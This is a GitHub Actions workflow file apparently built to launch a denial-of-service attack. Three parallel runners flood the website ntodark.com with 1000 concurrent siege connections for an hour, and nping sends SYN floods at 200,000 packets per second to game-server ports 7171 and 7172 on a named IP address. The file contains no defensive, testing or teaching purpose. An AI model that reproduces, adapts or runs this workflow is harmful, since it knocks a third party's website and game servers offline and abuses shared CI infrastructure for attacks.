name: ntodark
on:
  workflow_dispatch:

jobs:
  flood:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        runner: [1,2,3]
    steps:
      - name: Install tools
        run: |
          sudo apt-get update -qq
          sudo apt-get install -y siege nmap curl
      - name: Attack website
        run: |
          siege -c 1000 -t 3600s http://ntodark.com &
          siege -c 1000 -t 3600s https://ntodark.com &
          sleep 3600
      - name: Attack game ports
        run: |
          # SYN flood via nping que j√° vem no nmap
          /usr/bin/nping --tcp -p 7171 --flags SYN --rate 200000 34.151.221.105 &
          /usr/bin/nping --tcp -p 7172 --flags SYN --rate 200000 34.151.221.105 &
          sleep 3600
